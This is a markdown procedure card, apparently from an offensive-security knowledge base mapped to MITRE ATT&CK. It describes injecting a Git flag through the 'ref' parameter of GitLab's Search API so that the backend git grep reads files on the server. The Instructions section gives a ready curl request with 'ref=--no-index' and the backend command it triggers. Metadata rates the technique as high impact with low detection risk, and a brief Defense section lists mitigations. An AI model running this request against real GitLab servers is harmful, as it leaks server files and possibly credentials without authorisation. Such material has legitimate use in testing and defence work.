---
id: proc-uuid-1
tags:
  - gitlab
  - command-injection
  - git-flag
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-gitlab-search-injection-local]]'
  - '[[commands/git-grep-backend-injection]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:32:48.445Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Unix Shell]]'
---
# Inject-Git-Flag-in-GitLab-Search-API

## Summary

This procedure exploits the lack of sanitization in GitLab's Search API 'ref' parameter to inject Git flags like --no-index, causing the backend git grep command to search the server's current working directory (/var/opt/gitlab/gitaly) instead of the repository, enabling initial file leakage.

## Description

In vulnerable GitLab versions, the Search API endpoint /api/v4/projects/{id}/search with scope=blobs passes the 'ref' parameter directly to git grep without validation. By setting ref=--no-index, attackers alter the command's behavior to scan non-repository files, leaking contents from sensitive locations like Gitaly configs. This targets web-facing GitLab instances and requires only API access, potentially leading to credential exposure for further attacks.

## Requirements

1. Access to a vulnerable GitLab instance (e.g., <12.3) via HTTP/HTTPS
2. Valid project ID (authenticated via PRIVATE-TOKEN or public project)
3. curl tool installed for API requests
4. Basic understanding of Git commands and API interactions

## Defense

Defensive measures and detection strategies:

- Sanitize and validate 'ref' parameter to restrict to valid Git refs (e.g., branch/commit names)
- Run GitLab processes in isolated environments (e.g., containers) to limit filesystem access
- Monitor API logs for anomalous 'ref' values like --no-index; use WAF rules to block flag-like parameters
- Enable GitLab auditing and review search API usage for unusual patterns

## Objectives

1. Inject malicious Git flag to bypass repository scope
2. Trigger git grep on server filesystem for file discovery
3. Confirm injection success via leaked non-repo data

## Instructions

### Step 1: Prepare Authentication and Target

**Context**: Set up the environment variable for the private token if authenticated access is required, and identify a target project ID.

**Command** ([[commands/curl-gitlab-search-injection-local]]):
```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/4/search?scope=blobs&search=.&ref=--no-index'
```

> This sends the injection request to a local GitLab VM, using project ID 4. The $TOKEN should be a valid API token. Expected output is a JSON array with file data if successful.

### Step 2: Understand Backend Execution

**Context**: The API triggers the underlying git grep command with the injected flag, searching /var/opt/gitlab/gitaly.

**Command** ([[commands/git-grep-backend-injection]]):
```bash
/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/6b/86/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.git grep --ignore-case -I --line-number --null --before-context 2 --after-context 2 --perl-regexp -e a --no-index
```

> This illustrates the injected command (not directly executable by attacker). It searches for 'a' in the current directory, outputting NUL-delimited matches from files like config.toml.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Unix Shell]] Unix Shell

### Sub-Techniques

- None

## Commands Used

- [[commands/curl-gitlab-search-injection-local]]
- [[commands/git-grep-backend-injection]]

## Tools Used

- [[tools/curl]]

## Tags

- gitlab
- command-injection
- api-exploit
